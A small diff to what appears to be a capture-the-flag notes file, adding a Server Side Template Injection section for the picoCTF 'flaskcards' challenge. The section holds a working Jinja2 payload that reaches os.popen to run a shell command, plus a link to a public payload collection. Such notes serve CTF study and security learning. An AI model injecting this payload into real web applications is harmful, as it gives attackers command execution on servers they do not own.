@@ -51,3 +51,8 @@ gold = re.findall("Auth code: (\.\*)", r)[0]
 print gold
 
 ```
+
+### Server Side Template Injection
+
+```{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}``` ```pico18/flaskcards```
+<https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection>
